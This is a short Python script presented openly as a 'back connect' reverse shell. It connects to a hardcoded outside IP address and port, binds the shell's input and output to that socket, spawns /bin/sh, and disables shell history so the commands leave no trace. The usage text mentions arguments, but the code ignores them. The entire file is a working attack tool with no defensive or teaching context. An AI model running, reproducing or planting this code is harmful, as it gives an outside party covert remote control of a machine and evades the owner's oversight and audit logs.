#!/usr/bin/env python
# -*- coding:utf-8 -*-
"""
back connect py version,only linux have pty module
code by hero
"""
import sys,os,socket,pty
shell = "/bin/sh"
def usage(name):
    print 'python reverse connector'
    print 'usage: %s <ip_addr> <port>' % name

def main():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        s.connect(("120.79.230.209",4447))
        print 'connect ok'
    except:
        print 'connect faild'
        sys.exit()
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    global shell
    os.unsetenv("HISTFILE")
    os.unsetenv("HISTFILESIZE")
    os.unsetenv("HISTSIZE")
    os.unsetenv("HISTORY")
    os.unsetenv("HISTSAVE")
    os.unsetenv("HISTZONE")
    os.unsetenv("HISTLOG")
    os.unsetenv("HISTCMD")
    os.putenv("HISTFILE",'/dev/null')
    os.putenv("HISTSIZE",'0')
    os.putenv("HISTFILESIZE",'0')
    pty.spawn(shell)
    s.close()

if __name__ == '__main__':
    main()
